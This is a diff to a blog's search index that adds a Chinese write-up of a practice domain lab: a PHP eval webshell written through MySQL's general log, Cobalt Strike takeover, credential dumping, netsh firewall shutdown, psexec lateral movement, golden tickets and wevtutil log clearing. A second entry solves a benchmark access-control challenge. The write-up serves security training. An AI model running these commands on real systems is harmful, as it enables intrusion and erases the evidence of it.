@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>红日靶场1</title>
+      <link href="/2025/12/05/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
+      <url>/2025/12/05/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
+      
+        <content type="html"><![CDATA[<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><table><thead><tr><th>主机</th><th>IP Address</th></tr></thead><tbody><tr><td><strong>kali(vps)</strong></td><td><strong>192.168.31.128</strong></td></tr><tr><td><strong>win11(ATT)</strong></td><td><strong>192.168.31.1</strong></td></tr><tr><td><strong>win7(web)</strong></td><td><strong>192.168.31.129&#x2F;192.168.52.143</strong></td></tr><tr><td><strong>win2008(DC)</strong></td><td><strong>192.168.52.138</strong></td></tr><tr><td><strong>win2003</strong></td><td><strong>192.168.52.141</strong></td></tr></tbody></table><img src=/jpg/RedDay1/1.jpg><h2 id="0x02-外网渗透"><a href="#0x02-外网渗透" class="headerlink" title="0x02 外网渗透"></a>0x02 外网渗透</h2><h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./netscan.exe scan -t 192.168.31.0/24 -c 1500 -p 1-65535</span><br></pre></td></tr></table></figure><p>这里我用自己用go开发的内网扫描工具扫描了31段存活的主机因为这样扫描更快一些。</p><img src=/jpg/RedDay1/2.jpg><p>开启额3306和80端口，从web指纹识别可以看出来是phpstudy探针</p><p>访问80端口试试看：</p><img src=/jpg/RedDay1/3.jpg><p>php探针页面，下面可以测试数据库连接，直接弱口令尝试：<code>root/root</code></p><p>没想到一下就猜出来了哈哈哈哈哈哈哈哈哈。</p><p>这时候就要尝试远程登录他的数据库了：</p><img src=/jpg/RedDay1/31.jpg><p>可惜不让使用外部连接，这时候我们用dirsearch跑的目录应该也差不多了，去瞧一瞧：</p><img src=/jpg/RedDay1/4.jpg><p>这里我们扫到了phpMyAdmin这个目录，刚才拿到的数据库账号密码就可以使用了。</p><img src=/jpg/RedDay1/5.jpg><p>登录上来看到这里的数据库，进去翻了翻没什么特别有用的东西，就简单把一些用户名密码记录了一下。</p><p>接下来看看数据库是否有写入文件的权限：</p><img src=/jpg/RedDay1/6.jpg><p><code>show global variables like &quot;secure_file_priv&quot;；</code></p><ul><li>值为NULL，表示禁止文件的导入与导出</li><li>值为某一目录，表示只能对该目录下的文件导入与导出</li><li>值为空，表示不对文件的读写进行限制</li></ul><p>我们这里很明显不能写入文件，尝试用其他方式写马。</p><p><code>show global variables like &quot;general_log%&quot;;</code>查看日志功能。</p><img src=/jpg/RedDay1/7.jpg><p>日志功能是关着的，而且路径是：<code>C:\Users\Administrator\Desktop\phpStudy\MySQL\data...</code></p><p>打开日志功能并修改日志存放位置，修改为网站的目录下：</p><p><code>set global general_log=&#39;on&#39;;</code> &#x2F;&#x2F;开启日志</p><p><code>set global general_log_file=&quot;C:/phpStudy/WWW/shell.php&quot;</code> &#x2F;&#x2F;修改日志存放位置</p><img src=/jpg/RedDay1/8.jpg><h3 id="2-2-日志写马"><a href="#2-2-日志写马" class="headerlink" title="2.2 日志写马"></a>2.2 日志写马</h3><p><strong>思考</strong></p><p>mysql日志记录的是什么，记录的内容是不是sql语句的执行？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那就直接执行webshell即可被记录到日志后缀为php文件，若被解析则就GetShell了。</span><br></pre></td></tr></table></figure><p>在Web端执行<code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;</code></p><img src=/jpg/RedDay1/9.jpg><p>之后关闭日志记录</p><p><code>set global general_log=off;</code></p><p>成功执行，尝试使用蚁剑连接：</p><img src=/jpg/RedDay1/10.jpg><p>浏览器可以看到已经可以正常访问了，之后就是用蚁剑连接了。</p><img src=/jpg/RedDay1/11.jpg><p>成功连接，拿到administrator权限，下一步就是上线CS了</p><h2 id="0x03-上线CS"><a href="#0x03-上线CS" class="headerlink" title="0x03 上线CS"></a>0x03 上线CS</h2><h3 id="3-1-生成监听器"><a href="#3-1-生成监听器" class="headerlink" title="3.1 生成监听器"></a>3.1 生成监听器</h3><img src=/jpg/RedDay1/12.jpg><h3 id="3-2-生成木马"><a href="#3-2-生成木马" class="headerlink" title="3.2 生成木马"></a>3.2 生成木马</h3><img src=/jpg/RedDay1/13.jpg><h3 id="3-3-上传并执行木马"><a href="#3-3-上传并执行木马" class="headerlink" title="3.3 上传并执行木马"></a>3.3 上传并执行木马</h3><img src=/jpg/RedDay1/14.jpg><img src=/jpg/RedDay1/15.jpg><p><strong>成功上线CS</strong></p><h2 id="0x04-内网渗透"><a href="#0x04-内网渗透" class="headerlink" title="0x04 内网渗透"></a>0x04 内网渗透</h2><h3 id="4-1-主机信息获取"><a href="#4-1-主机信息获取" class="headerlink" title="4.1 主机信息获取"></a>4.1 主机信息获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span><span class="comment"># 当前用户</span></span><br><span class="line">net user <span class="comment"># 当前主机用户</span></span><br><span class="line">net localgroup administrators   <span class="comment"># 当前管理员组用户</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作系统信息</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br><span class="line"><span class="comment"># 系统架构</span></span><br><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br><span class="line"><span class="comment"># 安装的软件</span></span><br><span class="line">wmic product get name,version</span><br><span class="line"><span class="comment"># powershell收集</span></span><br><span class="line">shell powershell Get-WmiObject -class win32_product</span><br><span class="line"><span class="comment"># 进程信息</span></span><br><span class="line">shell wmic process list brief</span><br><span class="line"><span class="comment"># 防火墙策略信息</span></span><br><span class="line">shell netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域内信息</span></span><br><span class="line">net config workstation<span class="comment"># 查看当前工作环境</span></span><br><span class="line">net view        <span class="comment"># 查看域内用户</span></span><br><span class="line">net time /domain<span class="comment"># 查询域控</span></span><br><span class="line">ping DNS域名<span class="comment"># 得到域控IP</span></span><br><span class="line">nslookup 域名<span class="comment"># 解析得到域控IP</span></span><br></pre></td></tr></table></figure><h3 id="4-2-权限提升"><a href="#4-2-权限提升" class="headerlink" title="4.2 权限提升"></a>4.2 权限提升</h3><img src=/jpg/RedDay1/16.jpg><p>监听器选择刚才设置的web监听器，Exp选择<code>svc-exe</code>就可以了，别忘记修改回环间隔时间，因为我们是打的靶机，所以改成1S就可以了，如果实战不要这样很容易被发现。</p><p>执行完之后发现会话窗口多出一个<code>user</code>为<code>system</code>的主机证明提权成功了。</p><img src=/jpg/RedDay1/17.jpg><p>在我们拿到<code>system</code>权限之后就可以尝试抓取主机的密码了。</p><img src=/jpg/RedDay1/18.jpg><p>这里我们抓到了密码为:<code>123.com</code></p><p>这个时候我们找一下域内成员和域控主机</p><img src=/jpg/RedDay1/19.jpg><p>可以看到有三个成员，我们控制下的这个是<code>STU1</code>，域控主机为：<code>OWA</code></p><p>在前面我们搜集到的防火墙是开着的，这时候要保证我们能进一步渗透就要关掉这个恶心人的东西了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span>  <span class="comment"># windows 2003之前</span></span><br><span class="line">shell netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment"># windows 2003之后</span></span><br></pre></td></tr></table></figure><img src=/jpg/RedDay1/20.jpg><h3 id="4-3-横向移动"><a href="#4-3-横向移动" class="headerlink" title="4.3 横向移动"></a>4.3 横向移动</h3><p>我们已经掌握域控的内网IP了，加下来就要进行横向移动拿下域控主机。</p><p>扫描内网主机端口，进行大范围端口扫描</p><img src=/jpg/RedDay1/21.jpg><p>这里一定要选择内网的网段，不要选错，时间会长一些，稍微等一会，这时候可以喝口水或者听首歌缓解一下心情。</p><p>端口扫描这里我们着重看一下域控主机<code>（192.168.52.138）</code>的端口。</p><img src=/jpg/RedDay1/22.jpg><p>最后我们可以看到域内的三台主机都开启了445的smb服务，那我们可以建立一个smb监听，然后实现横向移动。</p><ul><li>SMB监听隧道的核心原理是利用SMB协议在目标主机上建立隐蔽的通信通道，绕过传统防火墙和入侵检测系统的监控。</li><li>SMB协议基础：文件共享，域名解析等，默认通过445端口通信</li></ul><img src=/jpg/RedDay1/23.jpg><p>建立好监听器后，我们切换攻击目标列表</p><img src=/jpg/RedDay1/24.jpg><p>选择域控主机进行横向移动–&gt;<code>psexec</code></p><img src=/jpg/RedDay1/25.jpg><p>监听就选择我们刚才建立的smb监听器，会话就选择我们的system权限的那个会话就可以了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec：是用于横向移动的核心工具之一。攻击者可以通过跳板机向目标主机发送命令，目标主机执行后，将结果返回给攻击者。但我认为这并不算上线，毕竟没有进行持久的连接，只是利用两个机器间的一些信任关系进行通信。</span><br></pre></td></tr></table></figure><img src=/jpg/RedDay1/26.jpg><p>这里我们就看到域控主机上线了，横向成功，进入域控，养成一个好习惯把防火墙关掉。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><img src=/jpg/RedDay1/27.jpg><p>域内另一台主机横向移动的思路是和这个一样的，按一样的操作去横向拿到另一台域主机的权限。</p><img src=/jpg/RedDay1/28.jpg><p><strong>到这里拿下域内全部主机！</strong></p><h3 id="4-4-权限维持"><a href="#4-4-权限维持" class="headerlink" title="4.4 权限维持"></a>4.4 权限维持</h3><p><strong>黄金票据</strong></p><p>黄金票据是指能够绕过认证授权机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统。</p><p>首先我们查看我们要写的用户，把<code>SID</code>，<code>域名</code>复制下来等下黄金票据要用。</p><p>选择要写票据的用户，抓取<code>hash</code>，再之后抓取<code>明文密码</code>，拿到<code>hash</code>，然后拿到明文密码详情页里面的<code>SID</code>，把<code>SID</code>复制下来，对域控主机选择<code>黄金票据</code>，把刚才复制的填进去。</p><img src=/jpg/RedDay1/29.jpg><p>等待片刻变成这样就是生成成功了，之后我们验证一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run klist</span><br></pre></td></tr></table></figure><img src=/jpg/RedDay1/30.jpg><h2 id="0x05-痕迹清除"><a href="#0x05-痕迹清除" class="headerlink" title="0x05 痕迹清除"></a>0x05 痕迹清除</h2><p>到现在，从外网到内网再到拿下域控到黄金票据，所有操作都会留下痕迹，所以最后一步我们就要进行痕迹清除了，从而保证我们的安全不被溯源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell wevtutil cl security<span class="comment"># 清理安全日志</span></span><br><span class="line">shell wevtutil cl system<span class="comment"># 清理系统日志</span></span><br><span class="line">shell wevtutil cl application<span class="comment"># 清理应用程序日志</span></span><br><span class="line">shell wevtutil cl <span class="string">&quot;windows powershell&quot;</span><span class="comment"># 清理powershell日志</span></span><br><span class="line">shell wevtutil cl setup<span class="comment"># 清理（cl）事件日志中的Setup事件。</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Benchmarks-XBEN-003-24</title>
       <link href="/2025/11/24/Benchmarks-XBEN-003-24/"/>
       <url>/2025/11/24/Benchmarks-XBEN-003-24/</url>
@@ -182,33 +207,22 @@
     
     
     <entry>
-      <title>分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>大神博客</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title></title>
       <link href="/XBOW-002.html"/>
       <url>/XBOW-002.html</url>
       
         <content type="html"><![CDATA[<h1 id="xben-001-24"><a href="#xben-001-24" class="headerlink" title="xben-001-24"></a>xben-001-24</h1><p>首先呢还是看一下README文件，其实还是和之前001的内容差不多，也是说存在越权啥的，前三关基本都是一个套路，这里就不多介绍了，还是多注意一下ID参数胡</p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>还是使用第一关找到的账号密码<code>test/test</code>进行登录</p><p>登录之后还是先看一下哪里有可能存在的漏洞，先不急着挂代理开始抓包，<strong>F12，启动！</strong></p><p>刚登上呢，可以看到还是有两个链接，一个是<code>Order</code>，一个是<code>OrderArchive</code>，点进<code>Order</code>查看，发现里面有几个订单，可以查看订单信息和归档</p><img src=/jpg/XBOW2/1.png><p>点击查看订单详情，还是老样子，和上一关的请求一样，只不过修改ID参数会报错，提示说：<strong>订单不存在或者订单没有归档</strong></p><img src=/jpg/XBOW/2.png><p>拿到这个信息之后，我们可以大胆猜测一下，既然不能直接修改ID越权查看，而且提示说归档相关，我们可以试试把订单归档，然后去<code>OrderArchive</code>里看一下</p><p>接下来测试一下，随便将一个订单归档，然后去归档订单里查看</p><img src=/jpg/XBOW/3.png><img src=/jpg/XBOW/4.png><img src=/jpg/XBOW/5.png><p>可以看到订单里的300123订单已经在归档订单里了，我们可以试试上一关的遍历ID来批量将订单归档，达到越权操作的目的</p><h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>打开抓包软件，开启拦截后点击归档，将请求拦截，选中ID后三位，将请求发送到攻击模块</p><img src=/jpg/XBOW/6.png><p>设置好payload类型和参数后，开始攻击，跑完之后搜flag搜不出来不用管，回到页面上，点击订单归档，查看都归档了哪些订单</p><img src=/jpg/XBOW/7.png><p>很明显，flag已经被归档了</p><img src=/jpg/XBOW/8.png><img src=/jpg/XBOW/9.png>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -229,6 +243,17 @@
       <title>标签</title>
       <link href="/tags/index.html"/>
       <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>大神博客</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
